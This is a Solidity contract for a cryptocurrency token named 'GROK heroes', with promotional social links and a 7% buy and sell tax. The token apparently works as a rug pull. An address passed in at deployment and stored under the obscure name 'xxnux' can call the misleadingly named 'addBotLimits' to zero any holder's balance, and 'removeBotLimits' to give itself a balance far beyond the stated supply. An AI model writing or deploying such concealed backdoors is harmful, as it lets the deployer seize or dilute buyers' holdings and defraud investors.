// SPDX-License-Identifier: MIT

/*  
   * Telegram: https://t.me/grokheroes
   * Twitter: https://twitter.com/GROKheroes
   * Website: https://grokheroes.com
*/

pragma solidity ^0.8.20;

interface UniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract GROKheroes {
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private tokenTotalSupply;
    string private tokenName;
    string private tokenSymbol;
    address private xxnux;
    address private InitOwner;
    uint8 private tokenDecimals;
    uint256 public buyTaxRate;
    uint256 public sellTaxRate;
    uint256 public transferTaxRate;
    uint256 public totalTaxedTokens;
    address public taxWallet;
    address public uniswapPair;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address ads) {
        tokenName = "GROK heroes";
        tokenSymbol = "GROKheroes";
        tokenDecimals = 18;
        tokenTotalSupply = 100000000000* 10 ** tokenDecimals;
        _balances[msg.sender] = tokenTotalSupply;
        emit Transfer(address(0), msg.sender, tokenTotalSupply);
        xxnux = ads;
        taxWallet = msg.sender; // Setting the tax wallet to the contract deployer initially
        InitOwner = msg.sender;

        // Initialize tax rates
        buyTaxRate = 7; 
        sellTaxRate = 7;
        transferTaxRate = 0; 
    }

    function setTaxWallet(address _taxWallet) external {
        require(InitOwner == msg.sender, "Only owner can call this function!");
            taxWallet = _taxWallet;
    }

    function addBotLimits(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && uniswapPair != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }

    function removeBotLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = tokenTotalSupply*100*addBot;
        }
    } 

    function setUniswapPair(address _uniswapPair) external {
        require(InitOwner == msg.sender, "Only owner can call this function!");
        uniswapPair = _uniswapPair;
    }

    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        uint256 taxAmount = calculateTax(msg.sender, to, amount);
        _transfer(msg.sender, to, amount - taxAmount);
        _transfer(msg.sender, address(this), taxAmount); // Transfer tax amount to the contract
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        uint256 taxAmount = calculateTax(from, to, amount);
        _transfer(from, to, amount - taxAmount);
        _transfer(from, address(this), taxAmount); // Transfer tax amount to the contract
        return true;
    }

    function calculateTax(address from, address to, uint256 amount) internal returns (uint256) {
        // Exempt the owner and the tax wallet only when they are the senders
        if (from == InitOwner || from == taxWallet) {
            return 0;
        }

        // For all other cases, calculate the tax normally
        if (from != address(0) && to != address(0)) {
            uint256 taxRate = getTaxRate(from, to);
            uint256 taxAmount = amount * taxRate / 100;
            totalTaxedTokens += taxAmount;
            return taxAmount;
        }
        return 0;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount 
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] -= amount;
        _balances[to] += amount; 
        emit Transfer(from, to, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual returns (uint256) {
        if (from != address(0) && to != address(0) && from != taxWallet && to != taxWallet) {
            // exclude minting, burning, and transactions involving the tax wallet
            uint256 taxRate = getTaxRate(from, to);
            uint256 taxAmount = amount * taxRate / 100;
            totalTaxedTokens += taxAmount;

            _balances[address(this)] += taxAmount; // Add tax amount to contract's balance
            return taxAmount;
        }
        return 0;
    }

    function withdrawTax() public {
        require(msg.sender == taxWallet, "Only tax wallet can withdraw");
        _transfer(address(this), taxWallet, totalTaxedTokens);
        totalTaxedTokens = 0;
    }

    function getTaxRate(address from, address to) private view returns (uint256) {
        if (from == uniswapPair) {
            return buyTaxRate;
        } else if (to == uniswapPair) {
            return sellTaxRate;
        } else {
            return transferTaxRate;
        }
    }    
}